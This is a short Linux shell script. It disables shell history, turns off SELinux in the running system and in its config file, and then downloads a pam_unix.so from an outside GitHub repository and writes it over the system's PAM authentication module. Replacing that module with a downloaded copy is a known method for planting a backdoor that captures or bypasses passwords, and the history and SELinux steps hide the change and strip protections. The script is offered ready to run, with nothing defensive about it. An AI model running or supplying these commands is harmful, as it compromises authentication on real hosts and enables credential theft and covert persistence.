set +o history
echo "------------------------------------"
setenforce 0
echo "------------------------------------"
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
echo "------------------------------------"
wget https://github.com/Pe1asguss/tes/raw/main/pam_unix.so -O /usr/lib64/security/pam_unix.so
echo "------------------------------------"
cat /etc/selinux/config
